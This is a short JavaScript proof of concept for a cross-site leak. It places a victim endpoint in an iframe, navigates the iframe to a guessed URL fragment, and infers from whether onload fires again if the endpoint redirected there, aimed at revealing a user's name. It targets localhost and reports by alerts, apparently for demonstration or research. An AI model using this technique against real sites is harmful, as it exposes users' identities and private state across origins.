const tryToGuessURL = (guessURL, victimURL) => {
  let iframe = document.createElement("iframe");
  iframe.src = victimURL;
  let didItLoad = false;

  iframe.onload = () => {
    iframe.onload = () => {
      didItLoad = true;
      alert(`The iframe wasn't redirected to ${guessURL}`);
    };

    iframe.contentWindow.location = `${guessURL}#1337`;
    setTimeout(() => {
      if (!didItLoad) alert(`The iframe was redirected to ${guessURL}`);
    }, 3000);
  };

  document.body.appendChild(iframe);
};

onload = () => {
  // This tries to guess that the "/me.php" endpoint redirects the user to "/invalidName.php"
  tryToGuessURL("http://localhost/invalidName.php", "http://localhost/me.php"); // This tries to guess that the "/me.php" endpoint redirects the user to "/victimName.php"

  tryToGuessURL("http://localhost/victimName.php", "http://localhost/me.php");
};